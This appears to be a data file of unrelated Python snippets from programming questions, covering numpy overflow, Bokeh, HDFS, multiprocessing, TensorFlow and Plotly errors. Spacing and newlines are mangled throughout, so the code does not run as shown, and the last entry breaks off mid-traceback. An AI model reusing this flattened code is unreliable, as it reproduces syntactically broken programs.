"import numpy as npclass MyClass ( object ) : def __init__ ( self , array_1 , array_2 ) : # Assigning arrays to be used in later methods self.array_1 = array_1 self.array_2 = array_2 # Assigning some scaling factors to be used in later methods . self.value_1 = np.prod ( self.array_1.shape ) self.value_2 = np.prod ( self.array_2.shape ) print ( `` Numpy Product Assignment : { 0 } , { 1 } '' .format ( self.value_1 , self.value_2 ) ) # Alternative assignment of scaling factors self.alt_value_1 = self.array_1.shape [ 0 ] * self.array_1.shape [ 1 ] self.alt_value_2 = self.array_2.shape [ 0 ] * self.array_2.shape [ 1 ] print ( `` Regular Product Assignment : { 0 } , { 1 } '' .format ( self.alt_value_1 , self.alt_value_2 ) ) pass def mymethod ( self ) : print ( `` Direct Multiplication : { 0 } '' .format ( 80160 * 262144 ) ) print ( `` Numpy Product Multiplication : { 0 } '' .format ( self.value_1 * self.value_2 ) ) print ( `` Regular Product Multiplcation { 0 } '' .format ( self.alt_value_1 * self.alt_value_2 ) ) if __name__ == '__main__ ' : test_array_1 = np.zeros ( [ 512 , 512 ] , dtype=complex ) test_array_2 = np.zeros ( [ 1002 , 80 ] , dtype=complex ) test_class = MyClass ( test_array_1 , test_array_2 ) test_class.mymethod ( ) C : /somepath/scratch.py:247 : RuntimeWarning : overflow encountered in long_scalars print ( `` Numpy Product Multiplication : { 0 } '' .format ( self.value_1 * self.value_2 ) ) Numpy Product Assignment : 262144 , 80160Regular Product Assignment : 262144 , 80160Direct Multiplication : 21013463040Numpy Product Multiplication : -461373440Regular Product Multiplcation 21013463040Process finished with exit code 0"
"from bokeh.models.ranges import Range1dfrom bokeh.plotting import figure , showfrom bokeh.models import LinearColorMapper , ColorBarimport numpy as npsx = 10sy = 5nx = 100ny = 100 arr = np.random.rand ( nx , ny ) x_range = Range1d ( start=0 , end=sx , bounds= ( 0 , sx ) ) y_range = Range1d ( start=0 , end=sy , bounds= ( 0 , sy ) ) # Attempt 1plot = figure ( x_range=x_range , y_range=y_range , match_aspect=True ) # Attempt 2 # plot = figure ( match_aspect=True ) # Attempt 3 # pw = 400 # ph = int ( 400/sx*sy ) # plot = figure ( plot_width=pw , plot_height=ph , # x_range=x_range , y_range=y_range , match_aspect=True ) color_mapper = LinearColorMapper ( palette= '' Viridis256 '' , low=arr.min ( ) , high=arr.max ( ) ) colorbar = ColorBar ( color_mapper=color_mapper , location= ( 0,0 ) ) plot.image ( [ arr ] , x= [ 0 ] , y= [ 0 ] , dw= [ sx ] , dh= [ sy ] , color_mapper=color_mapper ) plot.rect ( x= [ 0 , sx , sx,0 , sx/2 ] , y= [ 0,0 , sy , sy , sy/2 ] , height=1 , width=1 , color='blue ' ) plot.add_layout ( colorbar , 'right ' ) show ( plot ) plot = figure ( match_aspect=True ) pw = 800 # plot widthph = int ( pw/sx*sy ) plot = figure ( plot_width=pw , plot_height=ph , x_range=x_range , y_range=y_range , match_aspect=True ) x_range = DataRange1d ( range_padding=10 , range_padding_units='percent ' ) y_range = DataRange1d ( range_padding=10 , range_padding_units='percent ' )"
"from moduleA import decorator1from moduleB import decorator2 @ decorator2 ( foo='param3 ' , bar='param4 ' ) @ decorator1 ( name='param1 ' , state='param2 ' ) def myfunc ( funcpar1 , funcpar2 ) : ... @ mycustomdecorator ( name='param1 ' , state='param2 ' , foo='param3 ' , bar='param4 ' ) def myfunc ( funcpar1 , funcpar2 ) : ..."
"import osimport sysimport shutilimport codecsimport pydoop.hdfs as hdfsdef prepare_data ( hdfs_folder ) : folder = `` test_folder '' copies_count = 700 src_file = `` file '' # 1 ) create a folder if os.path.exists ( folder ) : shutil.rmtree ( folder ) os.makedirs ( folder ) # 2 ) create XXX copies of file in folder for x in range ( 0 , copies_count ) : shutil.copyfile ( src_file , folder+ '' / '' +src_file+ '' _ '' +str ( x ) ) # 3 ) copy folder to hdfs # hadoop fs -copyFromLocal test_folder/ /maaz/test_aa remove_command = `` hadoop fs -rmr `` + hdfs_folder print remove_command os.system ( remove_command ) command = `` hadoop fs -copyFromLocal `` +folder+ '' `` + hdfs_folder print command os.system ( command ) def main ( hdfs_folder ) : try : conn_hdfs = hdfs.fs.hdfs ( ) if conn_hdfs.exists ( hdfs_folder ) : items_list = conn_hdfs.list_directory ( hdfs_folder ) for item in items_list : if not item [ `` kind '' ] == `` file '' : continue file_name = item [ `` name '' ] print `` validating file : % s '' % file_name try : file_handle = conn_hdfs.open_file ( file_name ) file_line = file_handle.readline ( ) print file_line file_handle.close ( ) except Exception as exp : print ' # # # # Exception \ ' % s\ ' in reading file % s ' % ( str ( exp ) , file_name ) file_handle.close ( ) continue conn_hdfs.close ( ) except Exception as e : print `` # # # # Exception \ ' % s\ ' in validating files ! '' % str ( e ) if __name__ == '__main__ ' : hdfs_path = '/abc/xyz ' prepare_data ( hdfs_path ) main ( hdfs_path )"
"vocab sumCIaid 3tinnitu 3sudden 3squamou 3saphen 3problem 3prednison 3pain 2dysuria 3cancer 2 aid aid aid tinnitu tinnitu tinnitu sudden sudden sudden squamou squamou squamou def generate_wordcloud ( text ) : # optionally add : stopwords=STOPWORDS and change the arg below wordcloud = WordCloud ( background_color= '' white '' , width=1200 , height=1000 , relative_scaling = 1.0 , collocations=False ) .generate ( text ) plt.imshow ( wordcloud ) plt.axis ( `` off '' ) plt.show ( ) cidf=cidf.loc [ cidf.index.repeat ( cidf [ 'sumCI ' ] ) ] .reset_index ( drop=True ) strCI = ' '.join ( cidf [ 'vocab ' ] ) print ( strCI ) generate_wordcloud ( strCI )"
"[ ( 'What ' , ' 0 ' ) , ( 'the airspeed ' , ' 2-3 ' ) , ( 'an unladen swallow ' , ' 5-6-7 ' ) ] def extract_chunks ( tagged_sent , chunk_type ) : current_chunk = [ ] current_chunk_position = [ ] for idx , word_pos in enumerate ( tagged_sent ) : word , pos = word_pos if '-'+chunk_type in pos : # Append the word to the current_chunk . current_chunk.append ( ( word ) ) current_chunk_position.append ( ( idx ) ) else : if current_chunk : # Flush the full chunk when out of an NP . _chunk_str = ' '.join ( current_chunk ) _chunk_pos_str = '-'.join ( map ( str , current_chunk_position ) ) yield _chunk_str , _chunk_pos_str current_chunk = [ ] current_chunk_position = [ ] if current_chunk : # Flush the last chunk . yield ' '.join ( current_chunk ) , '-'.join ( current_chunk_position ) tagged_sent = [ ( 'What ' , ' B-NP ' ) , ( 'is ' , ' B-VP ' ) , ( 'the ' , ' B-NP ' ) , ( 'airspeed ' , ' I-NP ' ) , ( 'of ' , ' B-PP ' ) , ( 'an ' , ' B-NP ' ) , ( 'unladen ' , ' I-NP ' ) , ( 'swallow ' , ' I-NP ' ) , ( ' ? ' , ' O ' ) ] print ( list ( extract_chunks ( tagged_sent , chunk_type='NP ' ) ) ) tagged_sent = [ ( 'The ' , ' B-NP ' ) , ( 'Mitsubishi ' , ' I-NP ' ) , ( 'Electric ' , ' I-NP ' ) , ( 'Company ' , ' I-NP ' ) , ( 'Managing ' , ' B-NP ' ) , ( 'Director ' , ' I-NP ' ) , ( 'ate ' , ' B-VP ' ) , ( 'ramen ' , ' B-NP ' ) ] print ( list ( extract_chunks ( tagged_sent , chunk_type='NP ' ) ) ) [ ( 'The Mitsubishi Electric Company Managing Director ' , ' 0-1-2-3-4-5 ' ) , ( 'ramen ' , ' 7 ' ) ] [ ( 'The Mitsubishi Electric Company ' , ' 0-1-2-3 ' ) , ( 'Managing Director ' , ' 4-5 ' ) , ( 'ramen ' , ' 7 ' ) ]"
"Exception in thread Thread-5 : Traceback ( most recent call last ) : File `` /usr/lib/python2.7/threading.py '' , line 551 , in __bootstrap_inner self.run ( ) File `` /usr/lib/python2.7/threading.py '' , line 504 , in run self.__target ( *self.__args , **self.__kwargs ) File `` /usr/lib/python2.7/multiprocessing/pool.py '' , line 319 , in _handle_tasks put ( task ) SystemError : NULL result without error in PyObject_Call def runProcessesInParallelAndReturn ( proc , listOfInputs , nParallelProcesses ) : if len ( listOfInputs ) == 0 : return # Add result queue to the list of argument tuples . resultQueue = mp.Manager ( ) .Queue ( ) listOfInputsNew = [ ( argumentTuple , resultQueue ) for argumentTuple in listOfInputs ] # Create and initialize the pool of workers . pool = mp.Pool ( processes = nParallelProcesses ) pool.map ( proc , listOfInputsNew ) # Run the processes . pool.close ( ) pool.join ( ) # Return the results . return [ resultQueue.get ( ) for i in range ( len ( listOfInputs ) ) ] def solveForLFV ( param ) : startTime = time.time ( ) ( chunkI , LFVin , XY , sumLFVinOuterProductLFVallPlusPenaltyTerm , indexByIndexPurch , outerProductChunkSize , confWeight ) , queue = param LFoutChunkSize = XY.shape [ 0 ] nLFdim = LFVin.shape [ 1 ] sumLFVinOuterProductLFVpurch = np.zeros ( ( nLFdim , nLFdim ) ) LFVoutChunk = np.zeros ( ( LFoutChunkSize , nLFdim ) ) for LFVoutIndex in xrange ( LFoutChunkSize ) : LFVInIndexListPurch = indexByIndexPurch [ LFVoutIndex ] sumLFVinOuterProductLFVpurch [ : , : ] = 0 . LFVInIndexChunkLow , LFVInIndexChunkHigh = getChunkBoundaries ( len ( LFVInIndexListPurch ) , outerProductChunkSize ) for LFVInIndexChunkI in xrange ( len ( LFVInIndexChunkLow ) ) : LFVinSlice = LFVin [ LFVInIndexListPurch [ LFVInIndexChunkLow [ LFVInIndexChunkI ] : LFVInIndexChunkHigh [ LFVInIndexChunkI ] ] , : ] sumLFVinOuterProductLFVpurch += sum ( LFVinSlice [ : , : , np.newaxis ] * LFVinSlice [ : , np.newaxis , : ] ) LFVoutChunk [ LFVoutIndex , : ] = np.linalg.solve ( confWeight * sumLFVinOuterProductLFVpurch + sumLFVinOuterProductLFVallPlusPenaltyTerm , XY [ LFVoutIndex , : ] ) queue.put ( ( chunkI , LFVoutChunk ) ) print 'solveForLFV : ' , time.time ( ) - startTime , 'sec ' sys.stdout.flush ( )"
Example '' hello world my name is foobar '' is the same as `` my name is foobar world hello '' text = `` hello world my name is foobar '' textSplit = text.split ( ) pattern = `` foobar is my name world hello '' pattern = pattern.split ( ) count = 0for substring in pattern : if substring in textSplit : count += 1if ( count == len ( pattern ) ) : print ( `` same string detected '' ) text = `` fish the fish the fish fish fish '' pattern = `` the fish ''
"map = [ [ 1,2,3,4,5 ] , [ 2,3,4,2,3 ] , [ 2,2,2,1,2 ] , [ 3,2,1,2,3 ] , [ 4,6,5,7,4 ] ] MAP_WIDTH = 5 , MAP_HEIGHT = 5 actor.location = ( 3,3 ) actor.range = 2 range = 1location = ( 3 , 2 ) = > [ [ 2,3,4 ] , [ 3,4,2 ] , [ 2,2,1 ] ] range = 1location = ( 1,1 ) [ [ -1 , -1 , -1 ] , [ -1 , 1 , 2 ] , [ -1 , 2 , 3 ] ] range = 0location = ( 1 , 2 ) [ [ 2 ] ]"
"import cv2img = cv2.imread ( `` ./images/test.png '' ) img = cv2.cvtColor ( img , cv2.COLOR_BGR2GRAY ) 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 175 0 0 0 71 0 0 0 0 12 8 54 0 0 0 0 0 0 255 0 0 0 0 0 0 2 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 175 0 0 0 71 0 12 8 54 0 0 0 255 0 0 0 2 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 175 0 0 0 71 0 0 0 0 12 8 54 0 0 0 0 0 0 255 0 0 0 0 0 0 0 0 0 0 0 0 0 0 2 0 0 0 0 0 0 0 0 0 0 0 0 175 0 0 0 71 0 12 8 54 0 0 0 255 0 0 0 0 0 0 0 0 2 0 0 0"
"self.add_url_rule ( '/api/1/accounts/ < id_ > ' , view_func=self.accounts , methods= [ 'GET ' ] ) self.add_url_rule ( '/api/1/accounts/ < id_ > ' , view_func=self.accounts , methods= [ 'GET ' ] ) self.add_url_rule ( '/api/1//accounts/ < id_ > ' , view_func=self.accounts , methods= [ 'GET ' ] )"
"encryptedInput = builder.encrypt_as_array ( np.array ( [ 6,7 ] ) ) # type ( encryptedInput ) is < class 'numpy.ndarray ' > encryptedOutput = encryptedInput + encryptedInput builder.decrypt ( encryptedOutput ) # Result : np.array ( [ 12,14 ] ) out = encryptedInput @ encryptedInput # TypeError : Object arrays are not currently supported"
"G = [ [ 1 ] , [ 4 , 6 , 7 ] , [ 4 , 6 , 7 ] , [ 4 , 6 , 7 ] , [ 2 , 3 ] , [ 2 , 3 ] , [ 5 , 8 ] , [ 5 , 8 ] , [ ] , [ ] ] N = len ( G ) points = [ ] marked_stack = [ ] marked = [ False for x in xrange ( 0 , N ) ] g = Nonedef tarjan ( s , v , f ) : global g points.append ( v ) marked_stack.append ( v ) marked [ v ] = True for w in G [ v ] : if w < s : G [ v ] .pop ( G [ v ] .index ( w ) ) elif w == s : print points f = True elif marked [ w ] == False : if f == g and f == False : f = False else : f = True tarjan ( s , w , g ) g = f if f == True : u = marked_stack.pop ( ) while ( u ! = v ) : marked [ u ] = False u = marked_stack.pop ( ) # v is now deleted from mark stacked , and has been called u # unmark v marked [ u ] = False points.pop ( points.index ( v ) ) for i in xrange ( 0 , N ) : marked [ i ] = Falsefor i in xrange ( 0 , N ) : points = [ ] tarjan ( i , i , False ) while ( len ( marked_stack ) > 0 ) : u = marked_stack.pop ( ) marked [ u ] = False"
"import numpy as nparr = np.arange ( 6 ) .reshape ( ( 2 , 3 ) ) desired_shape = ( 5 , 8 ) reps = tuple ( [ x // y for x , y in zip ( desired_shape , arr.shape ) ] ) left = tuple ( [ x % y for x , y in zip ( desired_shape , arr.shape ) ] ) tmp = np.tile ( arr , reps ) tmp = np.r_ [ tmp , tmp [ slice ( left [ 0 ] ) , : ] ] tmp = np.c_ [ tmp , tmp [ : , slice ( left [ 1 ] ) ] ] array ( [ [ 0 , 1 , 2 , 0 , 1 , 2 , 0 , 1 ] , [ 3 , 4 , 5 , 3 , 4 , 5 , 3 , 4 ] , [ 0 , 1 , 2 , 0 , 1 , 2 , 0 , 1 ] , [ 3 , 4 , 5 , 3 , 4 , 5 , 3 , 4 ] , [ 0 , 1 , 2 , 0 , 1 , 2 , 0 , 1 ] ] ) import numpy as npdef tile_pad ( a , dims ) : return np.pad ( a , tuple ( ( 0 , i ) for i in ( np.array ( dims ) - a.shape ) ) , mode='wrap ' ) def tile_meshgrid ( a , dims ) : return a [ np.meshgrid ( * [ np.arange ( j ) % k for j , k in zip ( dims , a.shape ) ] , sparse=True , indexing='ij ' ) ] def tile_rav_mult_idx ( a , dims ) : return a.flat [ np.ravel_multi_index ( np.indices ( dims ) , a.shape , mode='wrap ' ) ] python -m timeit -s 'import numpy as np ' 'import newtile ' 'newtile.tile_pad ( np.arange ( 30 ) .reshape ( 2 , 3 , 5 ) , ( 3 , 5 , 7 ) ) 'python -m timeit -s 'import numpy as np ' 'import newtile ' 'newtile.tile_meshgrid ( np.arange ( 30 ) .reshape ( 2 , 3 , 5 ) , ( 3 , 5 , 7 ) ) 'python -m timeit -s 'import numpy as np ' 'import newtile ' 'newtile.tile_rav_mult_idx ( np.arange ( 30 ) .reshape ( 2 , 3 , 5 ) , ( 3 , 5 , 7 ) ) 'python -m timeit -s 'import numpy as np ' 'import newtile ' 'newtile.tile_pad ( np.arange ( 2310 ) .reshape ( 2 , 3 , 5 , 7 , 11 ) , ( 13 , 17 , 19 , 23 , 29 ) ) 'python -m timeit -s 'import numpy as np ' 'import newtile ' 'newtile.tile_meshgrid ( np.arange ( 2310 ) .reshape ( 2 , 3 , 5 , 7 , 11 ) , ( 13 , 17 , 19 , 23 , 29 ) ) 'python -m timeit -s 'import numpy as np ' 'import newtile ' 'newtile.tile_rav_mult_idx ( np.arange ( 2310 ) .reshape ( 2 , 3 , 5 , 7 , 11 ) , ( 13 , 17 , 19 , 23 , 29 ) ) ' pad : 10000 loops , best of 3 : 106 usec per loopmeshgrid : 10000 loops , best of 3 : 56.4 usec per loopravel_multi_index : 10000 loops , best of 3 : 50.2 usec per loop pad : 10 loops , best of 3 : 25.2 msec per loopmeshgrid : 10 loops , best of 3 : 300 msec per loopravel_multi_index : 10 loops , best of 3 : 218 msec per loop"
> > > class Person ( ) : ... pass ... > > > a=Person ( ) > > > bool ( a ) True
"# pylint : disable=R0921class Wrapper ( AbstractWrapper ) : ... def func ( self , kwargs** ) : raise NotImplementedError ..."
"from functools import wrapsdef coroutine ( function ) : @ wraps ( function ) def wrapper ( *args , **kwargs ) : generator = function ( *args , **kwargs ) next ( generator ) return generator return wrapper @ coroutinedef PlatinumCustomer ( successor=None ) : cust = ( yield ) if cust.custtype == 'platinum ' : print `` Platinum Customer '' elif successor is not None : successor.send ( cust ) @ coroutinedef GoldCustomer ( successor=None ) : cust = ( yield ) if cust.custtype == 'gold ' : print `` Gold Customer '' elif successor is not None : successor.send ( cust ) @ coroutinedef SilverCustomer ( successor=None ) : cust = ( yield ) if cust.custtype == 'silver ' : print `` Silver Customer '' elif successor is not None : successor.send ( cust ) @ coroutinedef DiamondCustomer ( successor=None ) : cust = ( yield ) if cust.custtype == 'diamond ' : print `` Diamond Customer '' elif successor is not None : successor.send ( cust ) class Customer : pipeline = PlatinumCustomer ( GoldCustomer ( SilverCustomer ( DiamondCustomer ( ) ) ) ) def __init__ ( self , custtype ) : self.custtype = custtype def HandleCustomer ( self ) : try : self.pipeline.send ( self ) except StopIteration : passif __name__ == '__main__ ' : platinum = Customer ( 'platinum ' ) gold = Customer ( 'gold ' ) silver = Customer ( 'silver ' ) diamond = Customer ( 'diamond ' ) undefined = Customer ( 'undefined ' ) platinum.HandleCustomer ( ) gold.HandleCustomer ( ) undefined.HandleCustomer ( )"
"-- -- -- -- Results -- -- -- -- Non threaded Duration : 0.012244000000000005 secondsThreaded Duration : 0.012839000000000017 seconds import mathfrom threading import Threaddef nonThreaded ( ) : primeNtoM ( 1,10000 ) def threaded ( ) : t1 = Thread ( target=primeNtoM , args= ( 1,5000 ) ) t2 = Thread ( target=primeNtoM , args= ( 5001,10000 ) ) t1.start ( ) t2.start ( ) t1.join ( ) t2.join ( ) def is_prime ( n ) : if n % 2 == 0 and n > 2 : return False for i in range ( 3 , int ( math.sqrt ( n ) ) + 1 , 2 ) : if n % i == 0 : return False return Truedef primeNtoM ( n , m ) : L = list ( ) if ( n > m ) : print ( `` n should be smaller than m '' ) return for i in range ( n , m ) : if ( is_prime ( i ) ) : L.append ( i ) if __name__ == '__main__ ' : import time print ( `` -- -- -- -- Nonthreaded calculation -- -- -- -- '' ) nTstart_time = time.clock ( ) nonThreaded ( ) nonThreadedTime = time.clock ( ) - nTstart_time print ( `` -- -- -- -- Threaded calculation -- -- -- -- '' ) Tstart_time = time.clock ( ) threaded ( ) threadedTime = time.clock ( ) - Tstart_time print ( `` -- -- -- -- Results -- -- -- -- '' ) print ( `` Non threaded Duration : `` , nonThreadedTime , `` seconds '' ) print ( `` Threaded Duration : `` , threadedTime , `` seconds '' )"
"import abcimport six @ six.add_metaclass ( abc.ABCMeta ) class A ( object ) : @ abc.abstractmethod def f ( self , arg1 ) : pass import mockmock_a = mock.Mock ( spec=A ) mock_a = mock.Mock ( spec=A ) # Succeedsprint mock_a.f ( 1 ) # Should fail , but returns a mockprint mock_a.f ( 1,2 ) # Correctly failsprint mock_a.x f_spec = mock.create_autospec ( A.f ) # Succeedsf_spec ( mock_a , 1 ) # Correctly failsf_spec ( mock_a , 1 , 2 )"
"# ! /usr/bin/python # Simply initiates a gstreamer pipeline without gtkimport gstimport gobjectimport sysmainloop = gobject.MainLoop ( ) my_bin = gst.element_factory_make ( `` playbin '' ) my_bin.set_property ( `` uri '' , `` file : ///home/Lumme-Badloop.ogg '' ) my_bin.set_state ( gst.STATE_PLAYING ) try : mainloop.run ( ) except KeyboardInterrupt : sys.exit ( 0 ) gst-launch-0.10 filesrc location=image.jpeg ! jpegdec ! freeze ! videoscale ! ffmpegcolorspace ! autovideosink pipe = gst.Pipeline ( `` mypipe '' ) source = gst.element_factory_make ( `` filesrc '' , `` filesource '' ) demuxer = gst.element_factory_make ( `` jpegdec '' , `` demuxer '' ) freeze = gst.element_factory_make ( `` freeze '' , `` freeze '' ) video = gst.element_factory_make ( `` videoscale '' , `` scaling '' ) ffm = gst.element_factory_make ( `` ffmpegcolorspace '' , `` muxer '' ) sink = gst.element_factory_make ( `` autovideosink '' , `` output '' ) pipe.add ( source , demuxer , freeze , video , ffm , sink ) filepath = `` file : ///home/image.jpeg '' pipe.get_by_name ( `` filesource '' ) .set_property ( `` location '' , filepath ) pipe.set_state ( gst.STATE_PLAYING ) # Create GStreamer pipelinepipeline = gst.Pipeline ( `` mypipeline '' ) # Set up our video test sourcevideotestsrc = gst.element_factory_make ( `` videotestsrc '' , `` video '' ) # Add it to the pipelinepipeline.add ( videotestsrc ) # Now we need somewhere to send the videosink = gst.element_factory_make ( `` xvimagesink '' , `` sink '' ) # Add it to the pipelinepipeline.add ( sink ) # Link the video source to the sink-xvvideotestsrc.link ( sink ) pipeline.set_state ( gst.STATE_PLAYING )"
"# ! /usr/bin/env pythonimport reimport timetests = [ r ' a\A ' , r ' b\A ' , r ' a^ ' , r ' b^ ' , r ' [ ^\s\S ] ' , r'^ ( ? < =a ) ' , r'^ ( ? < =b ) ' , r ' a ( ? < ! a ) ' , r ' b ( ? < ! b ) ' , r'\Za ' , r'\Zb ' , r ' $ a ' , r ' $ b ' ] timing = [ ] text = ' a ' * 50000000for t in tests : pat = re.compile ( t ) start = time.time ( ) pat.search ( text ) dur = time.time ( ) - start timing.append ( ( t , dur ) ) timing.sort ( key=lambda x : x [ 1 ] ) print ( ' % -30s % s ' % ( 'Pattern ' , 'Time ' ) ) for t , dur in timing : print ( ' % -30s % 0.3f ' % ( t , dur ) ) Pattern Timeb ( ? < ! b ) 0.043b\A 0.043b^ 0.043 $ a 0.382 $ b 0.382^ ( ? < =a ) 0.395\Za 0.395\Zb 0.395^ ( ? < =b ) 0.414a\A 0.437a^ 0.440a ( ? < ! a ) 0.796 [ ^\s\S ] 1.469"
class Foo ( object ) : passfoo = Foo ( ) def bar ( self ) : print 'bar'Foo.bar = barfoo.bar ( ) # bar
"def start_tf_server ( ) : import tensorflow as tf cluster = tf.train.ClusterSpec ( { `` local '' : [ tf_server_address ] } ) server = tf.train.Server ( cluster , job_name= '' local '' , task_index=0 ) server.join ( ) # block process from exiting p = multiprocessing.Process ( target=start_tf_server ) p.daemon=Truep.start ( ) # this process never ends , unless tf server crashes # WARNING ! Graph initialization must be made only after Tf server start ! # Otherwise everything will hang # I suppose this is because of another session will be # created before the server one # init model graph before branching processes # share graph in the current process scopeinterests = init_interests_for_process ( ) global_vars.multiprocess_globals [ `` interests '' ] = interests def init_interests_for_process ( ) : # Prevent errors on my GPU and disable tensorflow # complaining about CPU instructions import os os.environ [ `` CUDA_VISIBLE_DEVICES '' ] = `` '' os.environ [ 'TF_CPP_MIN_LOG_LEVEL ' ] = ' 2 ' import tensorflow as tf from tensorflow.contrib.keras import models # create tensorflow graph graph = tf.get_default_graph ( ) with graph.as_default ( ) : TOKENIZER = joblib.load ( TOKENIZER_FILE ) NN1_MODEL = models.load_model ( NN1_MODEL_FILE ) with open ( NN1_CATEGORY_NAMES_FILE , ' r ' ) as f : NN1_CATEGORY_NAMES = f.read ( ) .splitlines ( ) NN2_MODEL = models.load_model ( NN2_MODEL_FILE ) with open ( NN2_CATEGORY_NAMES_FILE , ' r ' ) as f : NN2_CATEGORY_NAMES = f.read ( ) .splitlines ( ) # global variable with all the data to be shared interests = { } interests [ `` TOKENIZER '' ] = TOKENIZER interests [ `` NN1_MODEL '' ] = NN1_MODEL interests [ `` NN1_CATEGORY_NAMES '' ] = NN1_CATEGORY_NAMES interests [ `` NN2_MODEL '' ] = NN2_MODEL interests [ `` NN2_CATEGORY_NAMES '' ] = NN2_CATEGORY_NAMES interests [ 'all_category_names ' ] = NN1_CATEGORY_NAMES + \ NN2_CATEGORY_NAMES # Reconstruct a Python object from a file persisted with joblib.dump . interests [ `` INTEREST_SETTINGS '' ] = joblib.load ( INTEREST_SETTINGS_FILE ) # dummy run to create graph x = tf.contrib.keras.preprocessing.sequence.pad_sequences ( TOKENIZER.texts_to_sequences ( `` Dummy srting '' ) , maxlen=interests [ `` INTEREST_SETTINGS '' ] [ `` INPUT_LENGTH '' ] ) y1 = NN1_MODEL.predict ( x ) y2 = NN2_MODEL.predict ( x ) # PROBLEM : I want , but can not lock graph , as child process # wants to run its own tf.global_variables_initializer ( ) # graph.finalize ( ) interests [ `` GRAPH '' ] = graph return interests def foo ( q ) : result = call_function_which_uses_interests_model ( some_data ) q.put ( result ) return # I 've read it is essential for destroying local variablesq = Queue ( ) p = Process ( target=foo , args= ( q , ) ) p.start ( ) p.join ( ) result = q.get ( ) # retrieve data # retrieve model from global variableinterests = global_vars.multiprocess_globals [ `` interests '' ] tokenizer = interests [ `` TOKENIZER '' ] nn1_model = interests [ `` NN1_MODEL '' ] nn1_category_names = interests [ `` NN1_CATEGORY_NAMES '' ] nn2_model = interests [ `` NN2_MODEL '' ] nn2_category_names = interests [ `` NN2_CATEGORY_NAMES '' ] input_length = interests [ `` INTEREST_SETTINGS '' ] [ `` INPUT_LENGTH '' ] # retrieve graphgraph = interests [ `` GRAPH '' ] # open session for serverlogger.debug ( 'Trying tf server at ' + 'grpc : //'+tf_server_address ) sess = tf.Session ( 'grpc : //'+tf_server_address , graph=graph ) # PROBLEM : and I need to run variables initializer : sess.run ( tf.global_variables_initializer ( ) ) tf.contrib.keras.backend.set_session ( sess ) # finally , make a call to server : with sess.as_default ( ) : x = tf.contrib.keras.preprocessing.sequence.pad_sequences ( tokenizer.texts_to_sequences ( input_str ) , maxlen=input_length ) y1 = nn1_model.predict ( x ) y2 = nn2_model.predict ( x ) FailedPreconditionError ( see above for traceback ) : Attempting to use uninitialized value gru_1/bias [ [ Node : gru_1/bias/read = Identity [ T=DT_FLOAT , _class= [ `` loc : @ gru_1/bias '' ] , _device= '' /job : local/replica:0/task:0/cpu:0 '' ] ( gru_1/bias ) ] ]"
"target_quote_object = re.search ( ' [ ? ] ( .* ? ) Reduced ' , example_string ) target_quote_text = target_quote_object.group ( 1 ) print ( target_quote_text [ 2 : ] )"
"timestamp_list = [ '1377091800 ' , '1377093000 ' , '1377094500 ' , '1377095500 ' ] ptime = 1377091810 timestamp_list = [ '1377091800 ' , '1377093000 ' , '1377094500 ' , '1377095500 ' ] ptime = 1377091810for idx , value in enumerate ( timestamp_list ) : val = long ( value ) if idx ! = len ( timestamp_list ) -1 and ptime > = val and ptime < long ( timestamp_list [ idx+1 ] ) : target = val breakelif ( idx == len ( timestamp_list ) -1 ) and ptime > = val : target = valelse : passprint target import bisecttimestamp_list = [ '1377091800 ' , '1377093000 ' , '1377094500 ' , '1377095500 ' ] ptime = str ( 1377093110 ) if ptime in timestamp_list : target = ptimeelse : index = bisect.bisect_right ( timestamp_list , ptime ) -1 target = timestamp_list [ index ] print target 1377093000"
"from plotly.graph_objs.scatter import Lineimport plotly.graph_objs as gotrace11 = go.Scatter ( x = [ 0 , 1 , 2 ] , y = [ 0 , 0 , 0 ] , line = Line ( { 'color ' : 'rgb ( 0 , 0 , 128 ) ' , 'width ' : 1 } ) ) trace12 = go.Scatter ( x= [ 0 , 1 , 2 ] , y= [ 1 , 1 , 1 ] , line = Line ( { 'color ' : 'rgb ( 128 , 0 , 0 ) ' , 'width ' : 1 } ) ) trace21 = go.Scatter ( x = [ 0 , 1 , 2 ] , y = [ 0.5 , 0.5 , 0.5 ] , line = Line ( { 'color ' : 'rgb ( 0 , 0 , 128 ) ' , 'width ' : 1 } ) ) trace22 = go.Scatter ( x= [ 0 , 1 , 2 ] , y= [ 1.5 , 1.5 , 1.5 ] , line = Line ( { 'color ' : 'rgb ( 128 , 0 , 0 ) ' , 'width ' : 1 } ) ) data1 = [ trace11 , trace12 ] data2 = [ trace21 , trace22 ] from plotly import toolsfig = tools.make_subplots ( rows=1 , cols=2 ) fig.append_trace ( data1 , 1 , 1 ) fig.append_trace ( data2 , 1 , 2 ) fig.show ( ) -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -ValueError Traceback ( most recent call last ) < ipython-input-6-ba20e4900d41 > in < module > 1 from plotly import tools 2 fig = tools.make_subplots ( rows=1 , cols=2 ) -- -- > 3 fig.append_trace ( data1 , 1 , 1 ) 4 fig.append_trace ( data2 , 1 , 2 ) 5 fig.show ( ) ~\Anaconda3\lib\site-packages\plotly\basedatatypes.py in append_trace ( self , trace , row , col ) 1797 ) 1798 - > 1799 self.add_trace ( trace=trace , row=row , col=col ) 1800 1801 def _set_trace_grid_position ( self , trace , row , col , secondary_y=False ) : ~\Anaconda3\lib\site-packages\plotly\basedatatypes.py in add_trace ( self , trace , row , col , secondary_y ) 1621 rows= [ row ] if row is not None else None , 1622 cols= [ col ] if col is not None else None , - > 1623 secondary_ys= [ secondary_y ] if secondary_y is not None else None , 1624 ) 1625 ~\Anaconda3\lib\site-packages\plotly\basedatatypes.py in add_traces ( self , data , rows , cols , secondary_ys ) 1684 1685 # Validate traces- > 1686 data = self._data_validator.validate_coerce ( data ) 1687 1688 # Set trace indexes~\Anaconda3\lib\site-packages\_plotly_utils\basevalidators.py in validate_coerce ( self , v , skip_invalid ) 2667 2668 if invalid_els : - > 2669 self.raise_invalid_elements ( invalid_els ) 2670 2671 v = to_scalar_or_list ( res ) ~\Anaconda3\lib\site-packages\_plotly_utils\basevalidators.py in raise_invalid_elements ( self , invalid_els ) 296 pname=self.parent_name , 297 invalid=invalid_els [ :10 ] , -- > 298 valid_clr_desc=self.description ( ) , 299 ) 300 ) ValueError : Invalid element ( s ) received for the 'data ' property of Invalid elements include : [ [ Scatter ( { 'line ' : { 'color ' : 'rgb ( 0 , 0 , 128 ) ' , 'width ' : 1 } , 